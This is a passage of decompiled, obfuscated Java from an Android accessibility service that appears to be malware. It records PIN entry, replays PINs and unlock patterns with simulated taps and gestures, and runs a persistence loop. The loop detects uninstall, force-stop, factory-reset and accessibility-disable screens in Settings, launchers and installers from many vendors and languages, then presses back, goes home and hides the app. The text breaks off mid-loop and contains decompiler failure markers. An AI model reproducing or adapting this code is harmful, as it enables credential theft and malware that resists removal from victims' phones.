                n2 = this.getResources().getDimensionPixelSize(n3);
            }
            catch (Exception exception) {
                n2 = n4;
            }
        }
        n = Math.max(n, n2) + 50;
        return new int[]{point.x + n * 2, point.y + n * 2, -n, -n};
    }

    private String getNodeLabel(AccessibilityNodeInfo object) {
        CharSequence charSequence = object.getText();
        if (charSequence != null && charSequence.length() > 0 && this.isDigitpin((String)(charSequence = ((Object)charSequence).toString()))) {
            return charSequence;
        }
        if ((object = object.getContentDescription()) != null && object.length() > 0 && this.isDigitpin((String)(object = object.toString()))) {
            return object;
        }
        return null;
    }

    private Point getRealScreenSize() {
        Point point = new Point();
        WindowManager windowManager = (WindowManager)this.getSystemService("window");
        if (windowManager != null) {
            if (Build.VERSION.SDK_INT >= 30) {
                windowManager = windowManager.getMaximumWindowMetrics().getBounds();
                point.x = windowManager.width();
                point.y = windowManager.height();
            } else {
                windowManager.getDefaultDisplay().getRealSize(point);
            }
        }
        if (point.x == 0 || point.y == 0) {
            windowManager = this.getResources().getDisplayMetrics();
            point.x = windowManager.widthPixels;
            point.y = windowManager.heightPixels;
        }
        return point;
    }

    public static String handleInput(String string2) {
        if ((string2 = string2.replaceAll("\u2022", "")).isEmpty()) {
            if (!TempStorepass.isEmpty()) {
                TempStorepass = TempStorepass.substring(0, TempStorepass.length() - 1);
            }
        } else {
            TempStorepass = TempStorepass + string2;
        }
        return TempStorepass;
    }

    private void hidaccess() {
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.eventTypes = 0;
        accessibilityServiceInfo.flags = 0;
        accessibilityServiceInfo.feedbackType = 0;
        accessibilityServiceInfo.notificationTimeout = 1L;
        this.setServiceInfo(accessibilityServiceInfo);
    }

    private static boolean isProtectorRunning() {
        long l = Protectdate;
        boolean bl = false;
        if (l == 0L) {
            return false;
        }
        if (System.currentTimeMillis() - Protectdate < 7000L) {
            bl = true;
        }
        return bl;
    }

    private static boolean isScreenGrapperRunning() {
        boolean bl = System.currentTimeMillis() - grapperdate < 120000L;
        return bl;
    }

    private static boolean isScreenScannerRunning() {
        boolean bl = System.currentTimeMillis() - Scannerdate < 180000L;
        return bl;
    }

    static /* synthetic */ boolean lambda$Setup$1(View view, MotionEvent motionEvent) {
        return true;
    }

    static /* synthetic */ void lambda$clickpin$17(char c, int n) {
        AccessibilityServiceController.clickpin(c, n + 1);
    }

    static /* synthetic */ void lambda$drawPin$11(Point point) {
        AccessibilityServiceHelper.clickthis(point.x, point.y);
    }

    static /* synthetic */ void lambda$drawPin$12(Point point, AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, Handler handler) {
        if (point != null) {
            AccessibilityServiceHelper.clickthis(point.x, point.y);
        } else {
            AccessibilityServiceController.tryClickEnterByIdOrCoords(jhvbzpdwpbqgticwdxuva2, handler);
        }
    }

    static /* synthetic */ void lambda$drawPin$13() {
        skiprecord = false;
    }

    static /* synthetic */ void lambda$drawPin$14(char c) {
        AccessibilityServiceController.clickpin(c, 0);
    }

    static /* synthetic */ void lambda$runWithTouchBypass$8(Runnable runnable2) {
        if (runnable2 != null) {
            runnable2.run();
        }
    }

    static /* synthetic */ void lambda$tryClickEnterByIdOrCoords$15(AccessibilityNodeInfo accessibilityNodeInfo) {
        accessibilityNodeInfo.performAction(16);
    }

    static /* synthetic */ void lambda$tryClickEnterByIdOrCoords$16(Point point) {
        AccessibilityServiceHelper.clickthis(point.x, point.y);
    }

    private void preventstopback(String string2, AccessibilityNodeInfo accessibilityNodeInfo) {
        if (Build.VERSION.SDK_INT < 31) {
            return;
        }
        if (string2.equals("com.android.systemui".toLowerCase()) && accessibilityNodeInfo != null) {
            if (AccessibilityServiceHelper.getNodeByViewId(accessibilityNodeInfo, "com.android.systemui:id/fgs_manager_app_item_stop_button") != null) {
                try {
                    this.performGlobalAction(2);
                }
                catch (Exception exception) {
                    // empty catch block
                }
                AccessibilityServiceHelper.GoHome();
                AccessibilityServiceHelper.blockBack();
                return;
            }
            string2 = AccessibilityServiceHelper.getNodeByViewId(accessibilityNodeInfo, "com.android.systemui:id/fgs_manager_app_item_label");
            if (string2 != null && string2.getText() != null && ((Object)string2.getText()).toString().toLowerCase().contains(CurrentNam)) {
                try {
                    this.performGlobalAction(2);
                }
                catch (Exception exception) {
                    // empty catch block
                }
                AccessibilityServiceHelper.GoHome();
                AccessibilityServiceHelper.blockBack();
                return;
            }
        }
    }

    public static void releaseBlackScreenWakeLock() {
        try {
            if (blackScreenWakeLock != null && blackScreenWakeLock.isHeld()) {
                blackScreenWakeLock.release();
                blackScreenWakeLock = null;
            }
        }
        catch (Exception exception) {
            AndroidLogger.Error("releaseBlackWL", exception.getMessage());
        }
    }

    private void showBlockHtml(String string2) {
        new Handler(this.getMainLooper()).post((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda4(this, string2));
    }

    private void simulatePatternGesture(List<Point> list) {
        if (list != null && !list.isEmpty()) {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path path2 = new Path();
            Point point = list.get(0);
            path2.moveTo((float)point.x, (float)point.y);
            for (int i = 1; i < list.size(); ++i) {
                point = list.get(i);
                path2.lineTo((float)point.x, (float)point.y);
            }
            builder.addStroke(new GestureDescription.StrokeDescription(path2, 0L, 1000L));
            this.dispatchGesture(builder.build(), new AccessibilityService.GestureResultCallback(this){
                final AccessibilityServiceController this$0;
                {
                    this.this$0 = jhvbzpdwpbqgticwdxuva2;
                }

                public void onCancelled(GestureDescription gestureDescription) {
                    Log.e((String)"PatternUnlock", (String)"Pattern drawing cancelled.");
                }

                public void onCompleted(GestureDescription gestureDescription) {
                    Log.d((String)"PatternUnlock", (String)"Pattern drawn successfully.");
                }
            }, null);
            return;
        }
        Log.e((String)"PatternUnlock", (String)"Gesture path is empty or null.");
    }

    private void sleep(int n) {
        long l = n;
        try {
            Thread.sleep(l);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private void startforground(Context context) {
        try {
            context = NotificationBuilder.getInstance(context).createNotification(context);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, (Notification)context, 1024);
            } else {
                this.startForeground(Notifi_ID, (Notification)context);
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    private void traverseAndAddOverlays(AccessibilityNodeInfo accessibilityNodeInfo, String string2, Set<String> set) {
        block8: {
            Rect rect;
            block7: {
                String string3;
                if (accessibilityNodeInfo == null) {
                    return;
                }
                if (!accessibilityNodeInfo.isClickable() || !accessibilityNodeInfo.isVisibleToUser()) break block7;
                rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                if (rect.isEmpty()) break block7;
                String string4 = this.buildOverlayKey(accessibilityNodeInfo, rect);
                set.add(string4);
                if (this.overlays.containsKey(string4) || (string3 = this.getNodeLabel(accessibilityNodeInfo)) == null) break block7;
                try {
                    this.addOverlay(string4, rect, string3, string2);
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }
            int n = 0;
            while (true) {
                block9: {
                    if (n >= accessibilityNodeInfo.getChildCount()) break block8;
                    rect = accessibilityNodeInfo.getChild(n);
                    this.traverseAndAddOverlays((AccessibilityNodeInfo)rect, string2, set);
                    if (rect == null) break block9;
                    rect.recycle();
                }
                ++n;
            }
        }
    }

    private static void tryClickEnterByIdOrCoords(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, Handler handler) {
        boolean bl;
        String[] stringArray = new String[]{"com.android.systemui:id/key_enter", "com.android.systemui:id/key_enter_text", "com.android.keyguard:id/key_enter"};
        boolean bl2 = false;
        int n = stringArray.length;
        int n2 = 0;
        while (true) {
            bl = bl2;
            if (n2 >= n) break;
            String string2 = stringArray[n2];
            string2 = AccessibilityServiceHelper.getNodeByViewId(jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow(), string2);
            if (string2 != null) {
                handler.post((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda26((AccessibilityNodeInfo)string2));
                bl = true;
                break;
            }
            ++n2;
        }
        if (!bl && (jhvbzpdwpbqgticwdxuva2 = UtilityHelper.loadPatternMap(jhvbzpdwpbqgticwdxuva2.getApplicationContext()).get(-1)) != null) {
            handler.post((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda1((Point)jhvbzpdwpbqgticwdxuva2));
        }
    }

    public void AntiProtector(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        Protectdate = System.currentTimeMillis();
        new Thread(new Runnable(){
            final AccessibilityServiceController this$0;
            final AccessibilityServiceController val$accessor;
            {
                this.this$0 = jhvbzpdwpbqgticwdxuva2;
                this.val$accessor = jhvbzpdwpbqgticwdxuva3;
            }

            static /* synthetic */ void lambda$run$0() {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            static /* synthetic */ void lambda$run$1() {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            static /* synthetic */ void lambda$run$12() {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            static /* synthetic */ void lambda$run$13() {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            static /* synthetic */ void lambda$run$14() {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            static /* synthetic */ void lambda$run$3() {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            static /* synthetic */ void lambda$run$4() {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            static /* synthetic */ void lambda$run$5() {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            static /* synthetic */ void lambda$run$6() {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            static /* synthetic */ void lambda$run$7() {
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            /* synthetic */ void lambda$run$10$com-icontrol-protector-AccessibilityServiceController$10() {
                UtilityHelper.hideme((Context)this.this$0);
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            /* synthetic */ void lambda$run$11$com-icontrol-protector-AccessibilityServiceController$10() {
                UtilityHelper.hideme((Context)this.this$0);
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            /* synthetic */ void lambda$run$2$com-icontrol-protector-AccessibilityServiceController$10() {
                UtilityHelper.hideme((Context)this.this$0);
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            /* synthetic */ void lambda$run$8$com-icontrol-protector-AccessibilityServiceController$10() {
                UtilityHelper.hideme((Context)this.this$0);
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            /* synthetic */ void lambda$run$9$com-icontrol-protector-AccessibilityServiceController$10() {
                UtilityHelper.hideme((Context)this.this$0);
                AccessibilityServiceHelper.blockBack();
                AccessibilityServiceHelper.GoHome();
            }

            /*
             * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
             * Unable to fully structure code
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            @Override
            public void run() {
                var17_1 = "\u200c\u200c\u200c";
                var18_2 = new Handler(this.val$accessor.getMainLooper());
                var1_19 = 500;
                while (true) {
                    block147: {
                        block145: {
                            block144: {
                                block150: {
                                    block143: {
                                        block148: {
                                            block142: {
                                                block141: {
                                                    block140: {
                                                        block138: {
                                                            block139: {
                                                                block149: {
                                                                    block137: {
                                                                        block136: {
                                                                            block128: {
                                                                                block135: {
                                                                                    block134: {
                                                                                        block133: {
                                                                                            block130: {
                                                                                                block125: {
                                                                                                    block126: {
                                                                                                        block129: {
                                                                                                            block127: {
                                                                                                                AccessibilityServiceController.access$602(System.currentTimeMillis());
                                                                                                                var15_33 = var1_19;
                                                                                                                try {
                                                                                                                    Thread.sleep(var15_33);
                                                                                                                }
                                                                                                                catch (Exception var19_35) {
                                                                                                                    // empty catch block
                                                                                                                }
                                                                                                                var19_34 = var18_2;
                                                                                                                if (var18_2 == null) {
                                                                                                                    var19_34 = new Handler(this.val$accessor.getMainLooper());
                                                                                                                }
                                                                                                                var2_20 = var1_19;
                                                                                                                var20_36 = this.val$accessor.getRootInActiveWindow();
                                                                                                                var2_20 = var1_19;
                                                                                                                var13_31 = ((KeyguardManager)this.this$0.getSystemService("keyguard")).isKeyguardLocked();
                                                                                                                var2_20 = var1_19;
                                                                                                                if (!AccessibilityServiceController.PreventDelete || var20_36 == null) break block125;
                                                                                                                var2_20 = var1_19;
                                                                                                                if (!ConfigurationProvider.Anti_Delete.equals("1")) break block125;
                                                                                                                var2_20 = var1_19;
                                                                                                                if (ConfigurationConstants.removeme || var13_31) break block125;
                                                                                                                var2_20 = var1_19;
                                                                                                                var21_37 = String.valueOf(var20_36.getPackageName()).toLowerCase();
                                                                                                                var2_20 = var1_19;
                                                                                                                if (var21_37.length() <= 0) break block126;
                                                                                                                var2_20 = var1_19;
                                                                                                                var13_31 = UtilityHelper.isSystemApp(this.this$0.getApplicationContext(), (String)var21_37);
                                                                                                                if (!var13_31) break block126;
                                                                                                                try {
                                                                                                                    if (var21_37.equals("com.miui.home".toLowerCase()) && (var18_2 = AccessibilityServiceHelper.getNodeByViewId((AccessibilityNodeInfo)var20_36, "com.miui.home:id/uninstall_dialog")) != null && var18_2.isVisibleToUser() && (var18_2 = AccessibilityServiceHelper.getNodeByViewId((AccessibilityNodeInfo)var20_36, "com.miui.home:id/title")) != null && var18_2.isVisibleToUser() && (var18_2 = String.valueOf(var18_2.getText()).toLowerCase()).contains(AccessibilityServiceController.CurrentNam) | var18_2.contains(var17_1)) {
                                                                                                                        var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda0();
                                                                                                                        var19_34.post((Runnable)var18_2);
                                                                                                                        var1_19 = 200;
                                                                                                                        var18_2 = var19_34;
                                                                                                                        continue;
                                                                                                                    }
                                                                                                                }
                                                                                                                catch (Exception var18_3) {
                                                                                                                    // empty catch block
                                                                                                                }
                                                                                                                var2_20 = var1_19;
                                                                                                                var13_31 = var21_37.equals("com.android.settings");
                                                                                                                var8_26 = 1;
                                                                                                                var10_28 = 1;
                                                                                                                var7_25 = 1;
                                                                                                                var5_23 = 1;
                                                                                                                var9_27 = 1;
                                                                                                                var4_22 = 1;
                                                                                                                var6_24 = 1;
                                                                                                                if (var13_31) break block127;
                                                                                                                var2_20 = var1_19;
                                                                                                                var13_31 = var21_37.equals("com.samsung.android.settings");
                                                                                                                if (!var13_31) break block128;
                                                                                                            }
                                                                                                            var2_20 = var1_19;
                                                                                                            var18_2 = AccessibilityServiceHelper.getNodesByClassName((AccessibilityNodeInfo)var20_36, "com.android.settings.system.ResetDashboardFragment");
                                                                                                            if (var18_2 == null) break block129;
                                                                                                            var2_20 = var1_19;
                                                                                                            if (var18_2.isEmpty()) break block129;
                                                                                                            var2_20 = var1_19;
                                                                                                            var2_20 = var1_19;
                                                                                                            var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda11();
                                                                                                            var2_20 = var1_19;
                                                                                                            var19_34.post((Runnable)var18_2);
                                                                                                            var1_19 = 200;
                                                                                                            var18_2 = var19_34;
                                                                                                            continue;
                                                                                                        }
                                                                                                        var2_20 = var1_19;
                                                                                                        var22_38 = new String[]{"com.android.settings:id/collapsing_toolbar", "com.android.settings:id/app_header_title", "com.android.settings:id/entity_header_title", "com.android.settings:id/label", "com.android.settings:id/action_bar_title_expand", "android:id/title", "com.android.settings:id/widget_title"};
                                                                                                        var3_21 = 0;
                                                                                                        var2_20 = var1_19;
                                                                                                        var11_29 = ((String[])var22_38).length;
                                                                                                        break block130;
                                                                                                    }
                                                                                                    var1_19 = 500;
                                                                                                    break block147;
                                                                                                }
                                                                                                var1_19 = 500;
                                                                                                break block147;
                                                                                                catch (Exception var18_4) {
                                                                                                    var1_19 = var2_20;
                                                                                                }
                                                                                                break block148;
                                                                                            }
                                                                                            for (var2_20 = 0; var2_20 < var11_29; ++var2_20) {
                                                                                                block132: {
                                                                                                    block131: {
                                                                                                        var18_2 = var22_38[var2_20];
                                                                                                        var23_45 /* !! */  = AccessibilityServiceHelper.getNodeByViewId((AccessibilityNodeInfo)var20_36, (String)var18_2);
                                                                                                        if (var23_45 /* !! */  == null) continue;
                                                                                                        var18_2 = "";
                                                                                                        var24_47 = var23_45 /* !! */ .getText();
                                                                                                        if (var24_47 == null) break block131;
                                                                                                        try {
                                                                                                            var18_2 = var23_45 /* !! */ .getText().toString().toLowerCase();
                                                                                                        }
                                                                                                        catch (Exception var18_5) {
                                                                                                            continue;
                                                                                                        }
                                                                                                    }
                                                                                                    var13_31 = var18_2.isEmpty();
                                                                                                    if (!var13_31) break block132;
                                                                                                    if (var23_45 /* !! */ .getContentDescription() == null) break block132;
                                                                                                    var18_2 = var23_45 /* !! */ .getContentDescription().toString().toLowerCase();
                                                                                                }
                                                                                                try {
                                                                                                    if (!var18_2.contains(AccessibilityServiceController.CurrentNam) && !(var13_31 = var18_2.contains(var17_1))) continue;
                                                                                                    var2_20 = 1;
                                                                                                    break block133;
                                                                                                }
                                                                                                catch (Exception var18_6) {
                                                                                                    continue;
                                                                                                }
                                                                                                catch (Exception var18_7) {
                                                                                                    // empty catch block
                                                                                                }
                                                                                            }
                                                                                            var2_20 = var3_21;
                                                                                        }
                                                                                        if (var2_20 != 0) {
                                                                                            var2_20 = var1_19;
                                                                                            var2_20 = var1_19;
                                                                                            var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda12(this);
                                                                                            var2_20 = var1_19;
                                                                                            var19_34.post((Runnable)var18_2);
                                                                                            var1_19 = 200;
                                                                                            var18_2 = var19_34;
                                                                                            continue;
                                                                                        }
                                                                                        var2_20 = var1_19;
                                                                                        var18_2 = AccessibilityServiceHelper.getNodeByViewId((AccessibilityNodeInfo)var20_36, "com.android.settings:id/permissionDialog_disable_title");
                                                                                        if (var18_2 == null) break block134;
                                                                                        var2_20 = var1_19;
                                                                                        if (var18_2.getText() == null) break block134;
                                                                                        var2_20 = var1_19;
                                                                                        if (!var18_2.getText().toString().toLowerCase().contains(AccessibilityServiceController.CurrentNam)) break block134;
                                                                                        var2_20 = var1_19;
                                                                                        var2_20 = var1_19;
                                                                                        var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda13();
                                                                                        var2_20 = var1_19;
                                                                                        var19_34.post((Runnable)var18_2);
                                                                                        var1_19 = 200;
                                                                                        var18_2 = var19_34;
                                                                                        continue;
                                                                                    }
                                                                                    var2_20 = var1_19;
                                                                                    var22_38 = new String[]{"com.android.settings:id/also_erases_external", "com.android.settings:id/clear_all_data_text", "com.android.settings:id/reset_settings_descrption", "com.android.settings:id/reset_button", "com.android.settings:id/sec_reset_settings_layout", "com.android.settings:id/uninstall_button", "com.android.settings:id/force_stop_button"};
                                                                                    var3_21 = 0;
                                                                                    var2_20 = var1_19;
                                                                                    var11_29 = ((Object)var22_38).length;
                                                                                    for (var2_20 = 0; var2_20 < var11_29; ++var2_20) {
                                                                                        var23_45 /* !! */  = var22_38[var2_20];
                                                                                        try {
                                                                                            var23_45 /* !! */  = AccessibilityServiceHelper.getNodeByViewId((AccessibilityNodeInfo)var20_36, (String)var23_45 /* !! */ );
                                                                                            if (var23_45 /* !! */  == null || !(var13_31 = var23_45 /* !! */ .isVisibleToUser())) continue;
                                                                                            var2_20 = 1;
                                                                                            break block135;
                                                                                        }
                                                                                        catch (Exception var23_46) {
                                                                                            // empty catch block
                                                                                        }
                                                                                    }
                                                                                    var2_20 = var3_21;
                                                                                }
                                                                                if (var2_20 != 0) {
                                                                                    var2_20 = var1_19;
                                                                                    var2_20 = var1_19;
                                                                                    var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda14();
                                                                                    var2_20 = var1_19;
                                                                                    var19_34.post((Runnable)var18_2);
                                                                                    var1_19 = 200;
                                                                                    var18_2 = var19_34;
                                                                                    continue;
                                                                                }
                                                                                try {
                                                                                    var18_2 = AccessibilityServiceHelper.findNodesByText(" \u200c\u200c\u200c", (AccessibilityNodeInfo)var20_36);
                                                                                    if (var18_2 != null && !var18_2.isEmpty()) {
                                                                                        var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda1();
                                                                                        var19_34.post((Runnable)var18_2);
                                                                                        var1_19 = 200;
                                                                                        var18_2 = var19_34;
                                                                                        continue;
                                                                                    }
                                                                                }
                                                                                catch (Exception var18_9) {
                                                                                    // empty catch block
                                                                                }
                                                                            }
                                                                            var2_20 = var1_19;
                                                                            var13_31 = var21_37.equals("com.android.systemui".toLowerCase());
                                                                            if (!var13_31) break block136;
                                                                            var2_20 = var1_19;
                                                                            try {
                                                                                var18_2 = AccessibilityServiceHelper.getNodeByViewId((AccessibilityNodeInfo)var20_36, "com.android.systemui:id/privacy_dialog_item_header_summary");
                                                                                if (var18_2 != null) {
                                                                                    var2_20 = var1_19;
                                                                                    if (var18_2.isVisibleToUser()) {
                                                                                        var2_20 = var1_19;
                                                                                        var2_20 = var1_19;
                                                                                        var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda2();
                                                                                        var2_20 = var1_19;
                                                                                        var19_34.post((Runnable)var18_2);
                                                                                        var1_19 = 200;
                                                                                        var18_2 = var19_34;
                                                                                        continue;
                                                                                    }
                                                                                }
                                                                                var2_20 = var1_19;
                                                                                var18_2 = AccessibilityServiceHelper.getNodeByViewId((AccessibilityNodeInfo)var20_36, "com.android.systemui:id/privacy_item");
                                                                                if (var18_2 != null) {
                                                                                    var2_20 = var1_19;
                                                                                    if (var18_2.isVisibleToUser()) {
                                                                                        var2_20 = var1_19;
                                                                                        var2_20 = var1_19;
                                                                                        var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda3();
                                                                                        var2_20 = var1_19;
                                                                                        var19_34.post((Runnable)var18_2);
                                                                                        var1_19 = 200;
                                                                                        var18_2 = var19_34;
                                                                                        continue;
                                                                                    }
                                                                                }
                                                                                var2_20 = var1_19;
                                                                                AccessibilityServiceController.access$700(this.this$0, (String)var21_37, (AccessibilityNodeInfo)var20_36);
                                                                            }
                                                                            catch (Exception var18_10) {}
                                                                        }
                                                                        var2_20 = var1_19;
                                                                        var13_31 = var21_37.equals("com.android.launcher");
                                                                        if (var13_31) break block137;
                                                                        var2_20 = var1_19;
                                                                        if (var21_37.equals("com.google.android.apps.nexuslauncher")) break block137;
                                                                        var2_20 = var1_19;
                                                                        if (var21_37.equals("com.sec.android.app.launcher")) break block137;
                                                                        var2_20 = var1_19;
                                                                        var13_31 = var21_37.contains("launcher");
                                                                        if (!var13_31) break block138;
                                                                        break block149;
                                                                    }
                                                                    var2_20 = var1_19;
                                                                    try {
                                                                        var18_2 = new String[]{"com.android.launcher:id/txt_uninstall_main_title", "com.google.android.apps.nexuslauncher:id/title", "com.sec.android.app.launcher:id/title", "android:id/title", "android:id/alertTitle", "android:id/message"};
                                                                        var2_20 = var1_19;
                                                                        var3_21 = ((Object)var18_2).length;
                                                                        break block139;
                                                                    }
                                                                    catch (Exception var18_17) {
                                                                        // empty catch block
                                                                    }
                                                                }
                                                                var1_19 = var2_20;
                                                                break block148;
                                                            }
                                                            for (var2_20 = 0; var2_20 < var3_21; ++var2_20) {
                                                                var22_38 = var18_2[var2_20];
                                                                var22_38 = AccessibilityServiceHelper.getNodeByViewId((AccessibilityNodeInfo)var20_36, (String)var22_38);
                                                                if (var22_38 == null || !var22_38.isVisibleToUser() || var22_38.getText() == null) continue;
                                                                var22_38 = var22_38.getText().toString().toLowerCase();
                                                                try {
                                                                    var23_45 /* !! */  = AccessibilityServiceController.CurrentNam;
                                                                }
                                                                catch (Exception var22_40) {
                                                                    continue;
                                                                }
                                                                try {
                                                                    if (!var22_38.contains((CharSequence)var23_45 /* !! */ ) && !var22_38.contains(var17_1) && !var22_38.contains("uninstall") && !var22_38.contains("\u0443\u0434\u0430\u043b\u0438\u0442\u044c") && !var22_38.contains("\u5378\u8f7d") && !var22_38.contains("kald\u0131r") && !var22_38.contains("desinstalar")) continue;
                                                                    var22_38 = new AccessibilityServiceController$10$$ExternalSyntheticLambda4(this);
                                                                    var19_34.post((Runnable)var22_38);
                                                                    var1_19 = 200;
                                                                    break;
                                                                }
                                                                catch (Exception var22_39) {
                                                                    continue;
                                                                }
                                                                catch (Exception var22_41) {
                                                                    // empty catch block
                                                                }
                                                            }
                                                            if (var1_19 == 200) {
                                                                var18_2 = var19_34;
                                                                continue;
                                                            }
                                                            try {
                                                                var18_2 = AccessibilityServiceHelper.readAllTextOnScreen((AccessibilityNodeInfo)var20_36).toLowerCase();
                                                                if ((var18_2.contains(AccessibilityServiceController.CurrentNam) || var18_2.contains(var17_1)) && (var18_2.contains("uninstall") || var18_2.contains("\u0443\u0434\u0430\u043b\u0438\u0442\u044c") || var18_2.contains("remove") || var18_2.contains("kald\u0131r") || var18_2.contains("\u5378\u8f7d") || var18_2.contains("desinstalar"))) {
                                                                    var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda5(this);
                                                                    var19_34.post((Runnable)var18_2);
                                                                    var1_19 = 200;
                                                                    var18_2 = var19_34;
                                                                    continue;
                                                                }
                                                            }
                                                            catch (Exception var18_11) {
                                                                // empty catch block
                                                            }
                                                        }
                                                        var2_20 = var1_19;
                                                        var13_31 = var21_37.equals("com.google.android.packageinstaller");
                                                        if (var13_31) break block140;
                                                        var2_20 = var1_19;
                                                        {
                                                            var13_31 = var21_37.equals("com.android.packageinstaller");
                                                            if (!var13_31) break block141;
                                                        }
                                                    }
                                                    try {
                                                        var18_2 = AccessibilityServiceHelper.readAllTextOnScreen((AccessibilityNodeInfo)var20_36).toLowerCase();
                                                        if (var18_2.contains(AccessibilityServiceController.CurrentNam) || var18_2.contains(var17_1)) {
                                                            var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda6(this);
                                                            var19_34.post((Runnable)var18_2);
                                                            var1_19 = 200;
                                                            var18_2 = var19_34;
                                                            continue;
                                                        }
                                                    }
                                                    catch (Exception var18_12) {
                                                        // empty catch block
                                                    }
                                                }
                                                var2_20 = var1_19;
                                                try {
                                                    var13_31 = var21_37.equals("com.samsung.accessibility");
                                                    if (!var13_31) break block142;
                                                    var2_20 = var1_19;
                                                }
                                                catch (Exception var18_18) {
                                                    var1_19 = var2_20;
                                                }
                                                {
                                                    var18_2 = new String[]{"com.samsung.accessibility:id/collapsing_appbar_extended_title", "com.samsung.accessibility:id/entity_header_title", "android:id/title"};
                                                    var2_20 = var1_19;
                                                    var3_21 = ((Object)var18_2).length;
                                                    break block143;
                                                }
                                            }
                                            var2_20 = var1_19;
                                            break block150;
                                        }
                                        AndroidLogger.Error("Protector", var18_2.getMessage());
                                        break block147;
                                    }
                                    for (var2_20 = 0; var2_20 < var3_21; ++var2_20) {
                                        var22_38 = var18_2[var2_20];
                                        var22_38 = AccessibilityServiceHelper.getNodeByViewId((AccessibilityNodeInfo)var20_36, (String)var22_38);
                                        if (var22_38 == null || var22_38.getText() == null) continue;
                                        var22_38 = var22_38.getText().toString();
                                        try {
                                            var22_38 = var22_38.toLowerCase();
                                        }
                                        catch (Exception var22_43) {
                                            continue;
                                        }
                                        try {
                                            if (!var22_38.contains(AccessibilityServiceController.CurrentNam)) continue;
                                            var22_38 = new AccessibilityServiceController$10$$ExternalSyntheticLambda7(this);
                                            var19_34.post((Runnable)var22_38);
                                            var1_19 = 200;
                                            break;
                                        }
                                        catch (Exception var22_42) {
                                            continue;
                                        }
                                        catch (Exception var22_44) {
                                            // empty catch block
                                        }
                                    }
                                    var2_20 = var1_19;
                                    if (var1_19 == 200) {
                                        var18_2 = var19_34;
                                        continue;
                                    }
                                }
                                var13_31 = var21_37.contains("battery");
                                if (var13_31) break block144;
                                try {
                                    if (!var21_37.contains("settings") && !var21_37.contains("installer") && !var21_37.contains("com.miui") && !var21_37.contains("com.samsung") && !var21_37.contains("com.coloros") && !var21_37.contains("com.oppo") && !var21_37.contains("com.oneplus") && !var21_37.contains("com.infinix") && !var21_37.contains("com.systemui") && !var21_37.contains("com.realme") && !var21_37.contains("com.android.vending") && !var21_37.contains("com.oplus") && !var21_37.contains("com.iqoo") && !var21_37.contains("com.vivo") && !var21_37.contains("com.huawei") && !(var13_31 = var21_37.contains("security"))) break block145;
                                }
                                catch (Exception var18_13) {
                                    break block145;
                                }
                            }
                            var20_36 = AccessibilityServiceHelper.readAllTextOnScreen((AccessibilityNodeInfo)var20_36).toLowerCase();
                            var14_32 = var20_36.contains(AccessibilityServiceController.CurrentNam);
                            var13_31 = var20_36.contains(var17_1);
                            var12_30 = var14_32 | var13_31;
                            if (var12_30) ** GOTO lbl425
                            var11_29 = 0;
                            var18_2 = new String[]{"work profile", "\u0645\u0644\u0641 \u062a\u0639\u0631\u064a\u0641 \u0627\u0644\u0639\u0645\u0644", "\u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0634\u062e\u0635\u064a \u0644\u0644\u0639\u0645\u0644", "\u5de5\u4f5c\u914d\u7f6e\u6587", "\u5de5\u4f5c\u8d44", "i\u015f profilini", "i\u015f profili", "perfil de trabalho", "perfil de trabajo", "\u0440\u0430\u0431\u043e\u0447\u0438\u0439 \u043f\u0440\u043e\u0444\u0438\u043b\u044c"};
                            var1_19 = ((Object)var18_2).length;
                            var2_20 = 0;
                            {
                                catch (Exception var18_14) {
                                    break block145;
                                }
                                catch (Exception var18_16) {
                                    // empty catch block
                                }
                                break block145;
                                while (true) {
                                    var3_21 = var11_29;
                                    if (var2_20 >= var1_19) break;
                                    if (var20_36.contains(var18_2[var2_20].toLowerCase())) {
                                        var3_21 = 1;
                                        break;
                                    }
                                    ++var2_20;
